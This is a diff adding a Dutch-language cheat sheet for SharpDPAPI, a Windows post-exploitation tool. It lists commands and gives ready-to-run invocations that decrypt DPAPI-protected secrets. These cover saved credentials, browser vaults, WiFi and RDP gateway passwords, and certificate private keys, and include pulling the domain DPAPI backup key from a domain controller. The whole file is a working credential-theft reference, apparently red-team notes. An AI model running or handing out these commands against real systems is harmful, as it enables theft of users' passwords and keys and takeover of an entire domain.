@@ -1,0 +1,53 @@
+# SharpDPAPI — DPAPI credential/vault decryptie
+# Decrypteert DPAPI beschermde data: wachtwoorden, RDP creds, WiFi, browser data
+#
+# === Syntax ===
+# SharpDPAPI.exe [commando] [opties]
+#
+# === Commando's ===
+# triage              Automatisch alle DPAPI secrets van huidige gebruiker
+# machinetriage       Machine-level DPAPI secrets (SYSTEM vereist)
+# backupkey           Domain DPAPI backup key ophalen (Domain Admin vereist)
+# masterkeys          DPAPI master keys decrypteren
+# credentials         Windows Credential Manager entries decrypteren
+# vaults              Windows Vault entries decrypteren
+# rdg                 Remote Desktop Gateway wachtwoorden
+# certificates        DPAPI beschermde certificaten + private keys
+# blob                Individuele DPAPI blob decrypteren
+#
+# === Opties ===
+# /target:path        Specifiek pad naar DPAPI data
+# /pvk:key.pvk        Domain backup key voor decryptie
+# /server:DC          Domain Controller voor backup key
+# /password:PASS      Gebruiker wachtwoord als decryptie sleutel
+# /mkfile:FILE        Bestand met bekende masterkeys
+#
+# === Voorbeelden ===
+
+# Automatische triage — alle credentials van huidige gebruiker
+SharpDPAPI.exe triage
+
+# Machine-level secrets (WiFi, scheduled tasks, services)
+SharpDPAPI.exe machinetriage
+
+# Domain DPAPI backup key ophalen (Domain Admin)
+SharpDPAPI.exe backupkey /server:DC01.DOMAIN
+
+# Credentials decrypteren met domain backup key
+SharpDPAPI.exe credentials /pvk:backup.pvk
+
+# Vaults decrypteren (browser wachtwoorden, etc.)
+SharpDPAPI.exe vaults
+
+# RDP Gateway wachtwoorden
+SharpDPAPI.exe rdg
+
+# Certificaten met private keys extraheren
+SharpDPAPI.exe certificates /pvk:backup.pvk
+
+# Masterkeys decrypteren met wachtwoord
+SharpDPAPI.exe masterkeys /password:PASS
+
+# NOTE: triage werkt zonder admin voor eigen gebruiker
+# NOTE: machinetriage vereist SYSTEM
+# NOTE: backupkey vereist Domain Admin rechten
